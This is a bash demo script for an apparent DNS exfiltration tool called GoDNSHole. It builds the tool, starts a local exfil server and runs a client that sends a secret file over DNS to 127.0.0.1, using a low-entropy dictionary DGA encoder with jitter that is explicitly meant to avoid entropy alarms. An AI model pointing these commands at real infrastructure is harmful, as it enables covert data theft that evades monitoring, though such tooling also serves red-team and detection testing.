#!/usr/bin/env bash

set -e

echo "=========================================="
echo " GoDNSHole - Dictionary DGA Demo"
echo "=========================================="
echo "This demo runs the DNS exfiltration client and server locally"
echo "using the new Dictionary-based Low-Entropy encoder."
echo ""

# Ensure we are in the project root
cd "$(dirname "$0")/.."

# Build components
echo "[+] Building components..."
./build.sh build

# Output payload
PAYLOAD="This is highly confidential data that needs to be exfiltrated through DNS without setting off entropy alarms!"
echo "$PAYLOAD" > secret.txt
echo "[+] Created secret.txt"

# Start server
echo "[+] Starting Exfil Server in the background (Port 5353)..."
./build/dns-exfil-server -port 5353 -domain test.com -encoding dictionary -output recovered.txt &
SERVER_PID=$!

sleep 2

# Start client
echo "[+] Starting Exfil Client..."
echo "[+] Exfiltrating data via Dictionary DGA with Jitter (30%)..."
./build/dns-exfil-client -server 127.0.0.1:5353 -domain test.com -encoding dictionary -file secret.txt -delay 500 -jitter 30

echo "[+] Client finished sending."
sleep 1

# Kill server gracefully
echo "[+] Stopping server..."
kill -SIGTERM $SERVER_PID
wait $SERVER_PID

echo "[+] Done! Verifying recovered data:"
echo "------------------------------------------"
cat recovered.txt
echo ""
echo "------------------------------------------"
rm secret.txt recovered.txt
